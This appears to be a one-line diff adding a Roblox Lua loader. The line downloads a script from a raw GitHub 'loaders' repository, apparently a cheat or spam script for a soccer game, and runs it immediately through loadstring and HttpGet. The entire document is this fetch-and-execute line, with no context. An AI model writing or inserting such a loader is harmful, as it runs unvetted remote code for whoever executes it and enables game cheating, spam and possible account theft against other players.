@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/update-illegal-soccer-spam4-on3nuuzygunsai.lua"))()
